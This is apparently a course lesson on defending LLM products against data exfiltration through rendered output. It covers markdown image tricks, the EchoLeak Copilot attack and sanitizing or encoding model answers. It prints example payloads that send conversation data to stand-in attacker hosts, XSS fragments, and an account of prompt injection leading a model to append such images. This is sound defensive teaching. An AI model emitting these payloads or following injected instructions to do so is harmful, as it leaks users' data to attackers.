# Exfiltration and Output Handling

The lethal trifecta (lesson 03) needs an external channel. The sneakiest channel is not a tool at all: it is **the answer itself**. Model output gets rendered as markdown in a chat window, inserted into HTML, written to a log, passed to a shell or a SQL query. Whatever interprets that output does what the text says. OWASP lists this as *Improper Output Handling* (LLM05 in the 2025 edition, LLM10 in 2026): treat model output like any other untrusted input to the next component.

## The zero-click image

```markdown
Your invoice is due on Friday.
![](https://attacker.example/pixel.png?d=reset-link-for-ada)
```

The user asked for a summary. An injected instruction told the model to append an image whose URL contains data from the conversation. The chat UI renders markdown, the browser fetches the image to display it, and the attacker's server logs the query string. Nobody clicked anything. Researchers have shown this pattern against most major chat assistants since 2023, and vendors fixed it one by one, usually by restricting which hosts images may load from.

The same idea comes in many shapes, and filters that handle one shape miss the next:

| Channel | Example | Needs a click? |
| --- | --- | --- |
| Inline image | `![x](https://evil/p.png?d=DATA)` | no |
| Reference-style image | `![x][r]` plus `[r]: https://evil/?d=DATA` on another line | no |
| Raw HTML | `<img src="https://evil/?d=DATA">` | no |
| Link | `[Verify your account](https://evil/?t=DATA)` | yes |
| Autolink or bare URL | `<https://evil/?d=DATA>`, `https://evil/?d=DATA` | yes |
| Tool call | `fetch_url({ url: "https://evil/?d=DATA" })` | no (lesson 03) |

EchoLeak (CVE-2025-32711, June 2025), a zero-click attack on Microsoft 365 Copilot, chained exactly these gaps: an email whose injection slipped past a classifier, reference-style markdown that the link redaction did not catch, an image fetched automatically, and an allowlisted Microsoft domain that proxied the request onward. The lesson: an allowlist is only as strong as its weakest allowed host. A domain with an open redirect, a proxy or user-controlled content is a channel.

## Sanitize before rendering

The rule is an **allowlist of hosts** your answers may reference, enforced on the output before anything renders it:

1. **Parse URLs properly.** Use a URL parser, compare the normalized hostname exactly (lowercase, no trailing dot), and reject anything that is not `https:`, carries credentials (`https://docs.example.com@evil.example/` goes to `evil.example`) or an unusual port. Substring checks (`url.includes('example.com')`) are the classic bypass.
2. **Images load without a click,** so drop anything outside the allowlist and strip the query string and fragment even from allowed hosts: data placed in the query is sent automatically.
3. **Links** to other hosts lose their URL and keep their text. Allowed links stay, since the user chooses to click them.
4. **Every syntax counts:** inline, reference-style, autolinks, bare URLs (GitHub-flavored markdown turns them into links) and raw HTML. Handle them in **one pass**, so text produced by one replacement is never re-parsed by the next.
5. **Record what you removed.** The list is evidence for monitoring: a spike in removed images is an attack in progress.

The challenge does this with regular expressions to keep the mechanism visible. In production, parse the markdown with a real parser, sanitize the resulting HTML with an allowlist sanitizer such as DOMPurify, and add a **Content Security Policy** (`img-src`, `connect-src`) as a second wall: if your sanitizer misses a construct, the browser still refuses to load the image.

## Encode for the target context

Removing dangerous constructs is half the job; the other half is **encoding** what remains for the place it goes. The same model output is safe in one context and an exploit in another:

| Target | Encode | Because |
| --- | --- | --- |
| HTML text | `&`, `<`, `>` as entities | `<img onerror=...>` becomes visible text |
| HTML attribute | also `"` and `'` | `" onfocus="alert(1)` cannot close the attribute |
| URL component | `encodeURIComponent` | `&admin=true` cannot add a parameter |
| SQL, shell | parameters and argument arrays, never string building | the model's text is data, not code |

Encode at the moment of insertion, once, for that context: encoding twice shows `&amp;amp;`, and encoding for the wrong context protects nothing. Frameworks such as React encode text by default; the risk returns the moment someone uses `dangerouslySetInnerHTML` or a markdown component that allows raw HTML.

> **Status as of October 2026:** markdown image exfiltration has been reported and fixed in most major chat assistants since 2023, and keeps reappearing in new products, IDE agents and integrations. EchoLeak (CVE-2025-32711) was rated critical and fixed server-side by Microsoft in 2025. OWASP's LLM Top 10 lists Improper Output Handling as LLM05 (2025 edition) and LLM10 (2026 edition).

## When to choose it

Sanitize and encode model output in every product where a model's answer is rendered, executed or forwarded, and treat the allowlist as part of the threat model: review every host on it for redirects, proxies and user-generated content. If the answer is only ever shown as plain text (no markdown, no HTML), encoding alone is enough; the moment you render markdown, you need the allowlist, the one-pass sanitizer and a CSP behind it.
